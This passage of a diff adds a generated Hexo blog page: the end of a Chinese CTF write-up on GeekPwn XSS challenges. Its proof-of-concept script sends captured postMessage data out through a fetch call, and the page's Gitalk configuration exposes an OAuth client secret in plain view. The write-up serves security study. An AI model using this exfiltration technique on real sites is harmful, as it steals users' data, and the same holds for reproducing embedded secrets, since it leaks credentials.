class="actionscript">            fetch(<span class="string">"/payload_is_"</span> + e.data.payload);</span></span><br><span class="line">        &#125;, 0);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交效果如下</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-final.png" class="" title="提交效果">
+<p>主要考察了 JS 代码审计能力，以及考察 <code>postMessage</code> 进行跨域通信的知识.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/GeekPwn/" rel="tag"># GeekPwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/29/hugo-fix-markup-math/" rel="prev" title="修复 Hugo 对 LaTeX 与 Markdown 转义字符冲突的问题">
+      <i class="fa fa-chevron-left"></i> 修复 Hugo 对 LaTeX 与 Markdown 转义字符冲突的问题
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#noxss-2020"><span class="nav-number">1.</span> <span class="nav-text">noxss 2020</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目概述"><span class="nav-number">1.1.</span> <span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目思路"><span class="nav-number">1.2.</span> <span class="nav-text">题目思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#链接-2017"><span class="nav-number">1.2.1.</span> <span class="nav-text">链接 2017</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#链接-2019"><span class="nav-number">1.2.2.</span> <span class="nav-text">链接 2019</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#两个链接的用意"><span class="nav-number">1.2.3.</span> <span class="nav-text">两个链接的用意</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过其中一个限制"><span class="nav-number">1.2.4.</span> <span class="nav-text">绕过其中一个限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小数字，大影响"><span class="nav-number">1.2.5.</span> <span class="nav-text">小数字，大影响</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-POC"><span class="nav-number">1.3.</span> <span class="nav-text">题目 POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#潜在用途"><span class="nav-number">1.4.</span> <span class="nav-text">潜在用途</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#umsg"><span class="nav-number">2.</span> <span class="nav-text">umsg</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目概述-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目思路-1"><span class="nav-number">2.2.</span> <span class="nav-text">题目思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目-POC-1"><span class="nav-number">2.3.</span> <span class="nav-text">题目 POC</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yscale"
+      src="https://avatars1.githubusercontent.com/u/13887988">
+  <p class="site-author-name" itemprop="name">yscale</p>
+  <div class="site-description" itemprop="description">yscale's CS blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/siger-young" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;siger-young" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-yscale"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yscale</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: '5029acc5b0d731935679',
+      clientSecret: '1527b60e3c2f74d647dc2ff464347745fc68bbb3',
+      repo: 'cs.yscale.cf',
+      owner: 'siger-young',
+      admin: ['siger-young'],
+      id: '22645caac1fd14735c0d45dcdf111df7',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
